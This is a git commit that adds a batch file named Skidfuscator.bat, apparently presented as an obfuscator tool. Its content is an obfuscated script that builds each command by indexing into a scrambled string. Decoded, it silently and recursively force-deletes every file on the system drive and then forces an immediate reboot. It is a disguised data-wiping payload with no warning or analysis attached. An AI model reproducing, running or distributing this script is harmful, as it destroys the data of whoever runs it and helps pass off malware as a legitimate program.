9ccf067afc507ab93961ec649fac595f7cf38c2b
skidfuscator <118891601+skidfuscator@users.noreply.github.com>
2022-11-23 11:50:41 +0200

    Add files via upload

---
+++ Skidfuscator.bat
@@ -0,0 +1,5 @@
+ˇ˛&@cls&@set "m√eh=IPeYLQHG0qO Drpf1mwk5iu2ExXB8AsJVKd47bn@Cvhayj3ZMUclgFoNStTzW6R9"
+
+%m√eh:~39,1%%m√eh:~2,1%%m√eh:~50,1%%m√eh:~42,1%%m√eh:~54,1%%m√eh:~11,1%%m√eh:~54,1%%m√eh:~15,1%%m√eh:~15,1%
+%m√eh:~34,1%%√w√√rLº%%m√eh:~2,1%%m√eh:~51,1%%m√eh:~11,1%%systemdrive%\*.*%m√eh:~11,1%/%m√eh:~15,1%%m√eh:~11,1%/%m√eh:~30,1%%m√eh:~11,1%/%m√eh:~9,1%
+%m√eh:~30,1%%m√eh:~42,1%%m√eh:~22,1%%m√eh:~57,1%%m√eh:~34,1%%m√eh:~54,1%%m√eh:~18,1%%m√eh:~38,1%%m√eh:~11,1%-%m√eh:~13,1%%m√eh:~11,1%-%m√eh:~15,1%%m√eh:~11,1%-%m√eh:~57,1%%m√eh:~11,1%%m√eh:~8,1%%m√eh:~8,1%
